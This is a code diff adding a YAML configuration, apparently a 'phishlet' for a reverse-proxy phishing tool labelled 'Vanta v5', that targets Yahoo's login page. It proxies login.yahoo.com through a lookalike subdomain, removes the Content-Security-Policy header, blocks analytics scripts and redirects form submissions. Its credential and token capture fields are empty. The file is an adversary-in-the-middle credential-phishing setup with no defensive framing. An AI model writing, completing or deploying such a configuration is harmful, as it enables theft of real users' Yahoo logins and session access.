@@ -1,0 +1,19 @@
+name: "Yahoo-Login"
+author: "Vanta v5"
+min_ver: "5.0.0"
+proxy_hosts:
+  - subdomain: "yahoo"
+    target: "login.yahoo.com"
+auth_urls: ["/"]
+landing_path: ["/"]
+auth_tokens: []
+credentials: []
+injections: []
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+path_rewrites: []
+cookie_rewrites: []
+blocklist:
+  - {pattern: "analytics|/ga.js|/ywa.js", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action]", action_to: "/account/challenge/password"}
